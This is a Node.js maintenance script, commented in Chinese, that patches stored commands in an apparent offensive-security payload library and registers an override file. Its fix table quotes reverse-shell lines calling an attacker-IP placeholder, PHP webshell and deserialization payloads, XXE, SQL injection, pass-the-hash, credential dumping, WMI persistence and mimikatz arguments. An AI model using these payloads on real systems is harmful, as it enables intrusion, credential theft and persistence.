#!/usr/bin/env node
/**
 * P1 命令修复（28 项审计确认）：expectedCommand 锚 DB 现值，from→to 或整条重写。
 * 生成 payload-command-overrides-p1fix-2026-09.json 并注册 manifest。
 */
const fs = require('fs');
const path = require('path');
const { DatabaseSync } = require('node:sqlite');
const ROOT = path.resolve(__dirname, '..');
const CR = p => path.join(ROOT, 'content-review', p);

const db = new DatabaseSync(path.join(ROOT, 'data/payloader.sqlite'), { readOnly: true });
const all = db.prepare('SELECT id, data FROM payloads').all().map(r => JSON.parse(r.data));
db.close();
const byId = new Map(all.map(p => [p.id, p]));

const F = [
  // 1. URL 参数残留
  { id: 'sqli2-blind-conditional-time-and-predicate-probes', area: 'execution', index: 0, from: 'username)&after=1&after=1)', to: 'username))' },
  // 2. XML 包裹残留
  { id: 'sqli2-union-extraction-lexical-encodings', area: 'execution', index: 0, from: '<string>\' union select current_user, 2#</string>', to: '\' union select current_user, 2#' },
  // 3. session 赋值顺序
  { id: 'rce-deserialize-php', area: 'execution', index: 3, from: '$_SESSION[\'a\'] = \'|O:7:"Exploit":0:{}\';\n// 读取侧若使用 php 处理器，| 之后的 O:7:"Exploit":0:{} 会被当作会话数据反序列化\nsession_start();', to: 'session_start();\n$_SESSION[\'a\'] = \'|O:7:"Exploit":0:{}\';\n// 读取侧若使用 php 处理器，| 之后的 O:7:"Exploit":0:{} 会被当作会话数据反序列化' },
  // 4. 内部子集参数实体引用：负样本对照注释
  { id: 'ssti2-xxe', area: 'execution', index: 0, full: '<!-- 负样本对照：内部子集实体值中引用参数实体，多数解析器（libxml2/Xerces）将直接拒绝；用于对照外部 DTD 组合形态 -->\n<!ENTITY % xxe SYSTEM "file://{FILE_PATH}">\n<!ENTITY test "%xxe;">\n<data>&test;</data>' },
  // 5. %dtd 未调用
  { id: 'ssti2-xxe-cdata', area: 'execution', index: 0, from: '<data>&all;</data>', to: '%dtd;\n<data>&all;</data>' },
  // 6. webshell-php ASP 行混入
  { id: 'webshell-php', area: 'execution', index: 0, from: '\n<% eval request("a") %>', to: '' },
  // 7. 无字母数字 XOR 坏样本行删除
  { id: 'webshell-php', area: 'wafBypass', index: 5, from: '\n<?php $__=(\'_\'^\'@\').(\'_\'^\'@\').(\'_\'^\'@\');$___=(\'_\'^\'@\').(\'_\'^\'@\');$__($___);?>', to: '' },
  // 8. 双花括号占位符（waf[8]/waf[9]）
  { id: 'rce-command-injection', area: 'wafBypass', index: 8, from: '{{ATTACKER_IP}}', to: '{ATTACKER_IP}', all: true },
  { id: 'rce-command-injection', area: 'wafBypass', index: 9, from: '{{ATTACKER_IP}}', to: '{ATTACKER_IP}', all: true },
  // 9. Jinja 反弹壳占位符三处
  { id: 'webshell-ssti-reverse-shell-jinja2-d4t4', area: 'execution', index: 0, from: 'nc -e /bin/sh {{ATTACKER_IP}} {LPORT}', to: 'nc -e /bin/sh {ATTACKER_IP} {LPORT}' },
  { id: 'webshell-ssti-reverse-shell-jinja2-d4t4', area: 'execution', index: 0, from: '/dev/tcp/{{ATTACKER_IP}}/{LPORT}', to: '/dev/tcp/{ATTACKER_IP}/{LPORT}' },
  { id: 'webshell-ssti-reverse-shell-jinja2-d4t4', area: 'execution', index: 0, from: 's.connect((\\"{{ATTACKER_IP}}\\",{LPORT}))', to: 's.connect((\\"{ATTACKER_IP}\\",{LPORT}))' },
  // 10. @include 位置
  { id: 'graphql-schema-exposure-boundary', area: 'wafBypass', index: 2, from: '"query":"query @include(if:true){__schema{queryType{name}}}"', to: '"query":"query{__schema @include(if:true){queryType{name}}}"' },
  // 11. 多余右括号
  { id: 'auth2-graphql', area: 'wafBypass', index: 2, from: '{user(username:\\"definitely_missing_9f2c\\")){id}}', to: '{user(username:\\"definitely_missing_9f2c\\"){id}}' },
  // 12. rbndr 格式（×2）
  { id: 'cmdi2-browser-dns-rebinding-iframe-probes', area: 'execution', index: 0, from: 'http://127.0.0.1-169.254.169.254.rbndr.us/', to: 'http://7f000001.a9fea9fe.rbndr.us/' },
  { id: 'cmdi2-browser-dns-rebinding-fetch-probes', area: 'execution', index: 0, from: 'http://127.0.0.1-169.254.169.254.rbndr.us/', to: 'http://7f000001.a9fea9fe.rbndr.us/' },
  // 13. GraphQL 操作名冒号
  { id: 'inject2-graphql-ext', area: 'wafBypass', index: 0, full: 'query Q1{__typename}\nmutation M1{__typename}\nsubscription S1{__typename}' },
  // 14. GWT 服务/方法字段拆分
  { id: 'nosql2-gwt', area: 'wafBypass', index: 1, from: '|com.lab.Service greeting|', to: '|com.lab.Service|greeting|' },
  // 16. dcomexec 目标主机
  { id: 'lateral-dcom-excel', area: 'execution', index: 2, from: '{LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{LAB_DOMAIN}', to: '{LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{LAB_HOST}' },
  // 17. Invoke-SMBClient 参数名
  { id: 'pass-the-hash', area: 'execution', index: 3, from: 'Invoke-SMBClient -Domain {LAB_DOMAIN} -User {LAB_USER}', to: 'Invoke-SMBClient -Domain {LAB_DOMAIN} -Username {LAB_USER}' },
  // 18. KeeThief 函数名
  { id: 'keepass-dump', area: 'execution', index: 2, from: "Get-KeePassPw", to: "Get-KeePassDatabaseKey" },
  // 19. netsh 输出 XML 强转
  { id: 'wifi-creds', area: 'wafBypass', index: 2, full: "powershell -nop -c \"$t=(netsh wlan show profile name='{LAB_SSID}' key=clear | Out-String); if($t -match 'Key Content\\\\s*:\\\\s*(\\\\S+)'){ $Matches[1] }\"" },
  // 20. 延迟展开参数伪装
  { id: 'evasion-arg-spoofing', area: 'execution', index: 1, full: 'cmd /v:on /c "set EVIL=malicious_command& cmd /c !EVIL!"' },
  // 21. __EventFilter 必需属性键
  { id: 'persistence-wmi', area: 'execution', index: 0, from: 'Namespace=\\"root\\subscription\\";', to: 'EventNamespace=\\"root\\cimv2\\";' },
  // 22. AssemblyLoadContext → .NET Framework 等价
  { id: 'evasion-clr-injection', area: 'wafBypass', index: 2, full: "[System.Reflection.Assembly]::LoadFile('{LAB_APPLICATION_BINARY}').EntryPoint.Invoke($null,@())" },
  // 23. MemoryMappedFile 工厂方法
  { id: 'process-injection', area: 'wafBypass', index: 0, from: "New-Object System.IO.MemoryMappedFiles.MemoryMappedFile($false,'Global\\payloader_shm',1048576)", to: "[System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateOrOpen('Global\\payloader_shm',1048576)" },
  // 25. dcshadow 参数行注释化
  { id: 'dcshadow-attack', area: 'execution', index: 2, full: '# mimikatz lsadump::dcshadow 属性推送参数（与上一步注册的服务器配合使用）\n/object:{LAB_OBJECT_DN} /attribute:primaryGroupID /value:519\n/attribute:sidHistory /value:S-1-5-21-{LAB_VALUE}-500' },
  // 26. 反斜杠双重转义
  { id: 'privilege-token', area: 'wafBypass', index: 2, from: 'C:\\\\Windows\\\\System32\\\\cmd.exe -a \\"/c whoami > C:\\\\Windows\\\\temp\\\\p.txt\\"', to: 'C:\\Windows\\System32\\cmd.exe -a \\"/c whoami > C:\\Windows\\temp\\\\p.txt\\"' },
  { id: 'privilege-token', area: 'wafBypass', index: 3, from: 'del C:\\\\Windows\\\\temp\\\\p.txt', to: 'del C:\\Windows\\temp\\p.txt' },
  // 27. kinit /dev/null → ccache 验证链
  { id: 'pass-the-ticket', area: 'wafBypass', index: 1, full: 'export KRB5CCNAME=/tmp/cc_{LAB_USER} && klist -c /tmp/cc_{LAB_USER} && kvno cifs/{LAB_HOST}' },
  // 28. 裸 URL → curl
  { id: 'exchange-mailbox-access', area: 'execution', index: 0, full: 'curl -k -sS --max-time 5 -o /dev/null -w "%{http_code}\\n" https://{EXCHANGE_HOST}/owa' },
  // 29. 缺 Content-Length（reset-host exec[0] 两段）
  { id: 'auth-reset-host-header', area: 'execution', index: 0, from: 'Content-Type: application/x-www-form-urlencoded\n\nemail=payloader-user%40example.invalid\n\nPOST', to: 'Content-Type: application/x-www-form-urlencoded\nContent-Length: 36\n\nemail=payloader-user%40example.invalid\n\nPOST' },
  { id: 'auth-reset-host-header', area: 'execution', index: 0, from: 'X-Forwarded-Host: callback.example.invalid\nContent-Type: application/x-www-form-urlencoded\n\nemail', to: 'X-Forwarded-Host: callback.example.invalid\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\n\nemail' },
  // 30. 2fa JSON 体缺 Content-Length
  { id: 'auth-2fa-state-enforcement', area: 'execution', index: 0, from: 'Content-Type: application/json\n\n{\\"otp\\":\\"000000\\",\\"skip\\":true}', to: 'Content-Type: application/json\nContent-Length: 27\n\n{\\"otp\\":\\"000000\\",\\"skip\\":true}' },
  // 31. 裸 Python → heredoc
  { id: 'auth-2fa-recovery-code', area: 'execution', index: 0, from: 'import concurrent.futures', to: "python3 - <<'PY'\nimport concurrent.futures" },
  { id: 'auth-2fa-recovery-code', area: 'execution', index: 0, from: 'print(results)\n# Expected', to: 'print(results)\nPY\n# Expected' },
];

const entriesById = new Map();
const push = (id, patch) => {
  if (!entriesById.has(id)) entriesById.set(id, { id, patches: [] });
  entriesById.get(id).patches.push(patch);
};
let ok = 0, fail = 0;
for (const f of F) {
  const p = byId.get(f.id);
  const step = p && (p[f.area] || [])[f.index];
  if (!p || !step) { console.log('✗ 目标不存在:', f.id, f.area, f.index); fail++; continue; }
  const cmd = step.command || '';
  let next = null;
  if (f.full !== undefined) next = f.full;
  else {
    if (!cmd.includes(f.from)) { console.log('✗ from 未命中:', f.id, f.area + '[' + f.index + ']', JSON.stringify(f.from).slice(0, 70)); fail++; continue; }
    next = f.all === true ? cmd.split(f.from).join(f.to) : cmd.replace(f.from, f.to);
  }
  if (next === cmd) { console.log('△ 无变化:', f.id, f.area, f.index); continue; }
  push(f.id, { area: f.area, index: f.index, expectedCommand: cmd, command: next });
  ok++;
}
const doc = { schemaVersion: 1, entries: [...entriesById.values()] };
const DOC = 'payload-command-overrides-p1fix-2026-09.json';
fs.writeFileSync(CR(DOC), JSON.stringify(doc, null, 2) + '\n');
const manifest = JSON.parse(fs.readFileSync(CR('manifest.json'), 'utf8'));
if (!manifest.payloadCommandOverrideFiles.includes(DOC)) {
  manifest.payloadCommandOverrideFiles.push(DOC);
  manifest.payloadCommandOverrideFiles.sort();
  fs.writeFileSync(CR('manifest.json'), JSON.stringify(manifest, null, 2) + '\n');
}
console.log(`P1 修复: ${ok} 成功 / ${fail} 失败 / ${doc.entries.length} 条 → ${DOC}`);
